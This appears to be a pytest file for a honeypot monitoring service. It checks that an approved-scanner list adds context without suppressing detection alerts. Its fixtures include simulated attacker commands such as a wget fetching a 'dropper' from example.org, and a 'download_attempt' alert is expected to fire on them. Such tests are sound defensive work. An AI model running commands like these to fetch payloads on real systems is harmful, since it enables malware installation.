import json

from aegis_nexus.app import create_app
from aegis_nexus.benign_scanners import BenignScannerContext
from aegis_nexus.model import normalize_event


def _write_list(path):
    path.write_text(json.dumps({
        "source": "operator-approved-scanners",
        "entries": [{
            "cidr": "198.51.100.0/24",
            "name": "lab vulnerability scanner",
            "description": "Known scanner context only",
        }],
    }), encoding="utf-8")


def test_benign_scanner_context_is_explicitly_non_suppressing(tmp_path):
    path = tmp_path / "scanners.json"
    _write_list(path)
    provider = BenignScannerContext(str(path))
    event = normalize_event({
        "honeypot": "ssh-1",
        "event_type": "command",
        "severity": "high",
        "observed": {
            "source_ip": "198.51.100.42",
            "service": "ssh",
            "protocol": "tcp",
            "destination_port": 22,
            "command": "wget https://example.org/file",
        },
    })
    enriched = provider.enrich(event)
    block = enriched["enrichment"]["benign_scanner_context"]
    assert block["context_only"] is True
    assert block["suppression"] is False
    assert block["source"] == "operator-approved-scanners"
    assert enriched["severity"] == "high"
    assert enriched["observed"]["command"] == event["observed"]["command"]


def test_benign_scanner_match_does_not_suppress_detection_alert(tmp_path):
    scanner_file = tmp_path / "scanners.json"
    _write_list(scanner_file)
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "ingest-secret",
        "BENIGN_SCANNER_FILE": str(scanner_file),
    })
    client = app.test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "ingest-secret"},
        json={
            "honeypot": "ssh-decoy-01",
            "event_type": "command",
            "severity": "medium",
            "observed": {
                "source_ip": "198.51.100.42",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget https://example.org/dropper",
            },
        },
    )
    assert response.status_code == 201
    event = client.get(f"/api/v1/events/{response.get_json()['id']}").get_json()
    assert event["enrichment"]["benign_scanner_context"]["suppression"] is False

    alerts = client.get("/api/v1/alerts").get_json()["items"]
    assert any(item["rule_id"] == "download_attempt" for item in alerts)

    status = client.get("/api/v1/benign-scanners/status").get_json()
    assert status["ready"] is True
    assert status["suppression"] is False


def test_benign_scanner_invalid_file_fails_context_only(tmp_path):
    path = tmp_path / "bad.json"
    path.write_text("{", encoding="utf-8")
    provider = BenignScannerContext(str(path))
    assert provider.status()["ready"] is False
    assert provider.status()["suppression"] is False
